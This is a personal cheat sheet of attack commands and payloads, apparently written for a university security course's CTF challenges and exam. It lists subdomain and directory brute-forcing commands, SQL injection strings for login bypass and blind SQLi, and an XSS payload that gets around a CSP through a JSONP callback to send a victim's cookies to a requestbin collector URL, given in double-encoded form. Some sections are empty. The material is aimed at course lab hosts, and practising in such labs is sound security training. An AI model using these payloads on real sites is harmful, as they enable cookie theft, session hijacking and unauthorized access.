# 6843 CMDS + PAYLOADS  
Copy pasta some quick access commands + payloads for CTF challenges + exam.  

---
### Security Setup
---

**EC2 Web Server**
1. Log in to EC2 instance.
2. Launch HTTP server `python -m SimpleHTTPServer 80`
3. Hit it with requests / capture some admin cookies :)

**Alternatives to capture requests**
* https://requestbin.fullcontact.com/
* http://webhookinbox.com/

---
### Common 6843 words
---
Port Numbers, Directories, Subdomains... be imaginative.
```
noone
sketch
sketchy
9447
6841
6441
```
---
### Recon: Subdomain Bruteforcing
---

**Aquatone**
```
ssh ec2-user@tehec2instanceidduh.aws.etc.etc        // get in
cd /home/ec2-user/sec_tools/RECON/aquatone          // go to aquatone
aquatone-discover --domain [ ns.agency ]            // run subdomain bruteforcing
cat ~/aquatone/example.com/hosts.txt                // show discovered subdomains
```
**GoBuster DNS Mode**
```
See below instructions @ dir bruteforcing.
go run main.go -m dns -u [ https://ns.agency ] -w /path/to/wordlist      // run subdomain bruteforcing
```
---
### Recon: Directory Bruteforcing
---

**GoBuster**
```
cd /Users/brianlam/go/src/gobuster                  // go to gobuster sources
go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common.wordlist    // run dir bruteforcing
```

---
### SQLi
---

**Authentication Bypass**
```
admin' --
' or 1=1--
' or '1'='1
' or '1'='1 --
```

**Verification: Blind SQLi**
```
%' AND 1=1 AND '%'='                  // BOOLEAN: TRUE
%' AND 1=0 AND '%'='                  // BOOLEAN: FALSE
company=sap%' AND SLEEP(5) AND '%'='  // TIME-BASED
```

**Sqlmap Commands**
```

```



---
### Advanced Injection
---

---
### XSS Normal + Advanced
---
**Useful JS web API methods for XSS**  
Redirect a user/admin to your url to steal their cookies.
```
fetch()
window.onload()
document.location()
window.location.replace()
window.location.reload()
window.location.assign()
```

**CSP Bypass**  
Bypass via. JSONP API callback param:
```
Verify:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=alert('xss');//"></script>

Payload Original:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c='+document.cookie);//"></script>

Payload Step #1 => Encode x1:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%3D'%2Bdocument.cookie);//"></script>

Payload Step #2 => Encode x2:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%253D'%252Bdocument.cookie);//"></script>

Note:
- Encoding needs to be performed twice as the initial POST request to the target server will decode it once, then another round of decoding will be performed upon the target's callback to your attacker url.
```


---
### Server-Side Request Forgery
---


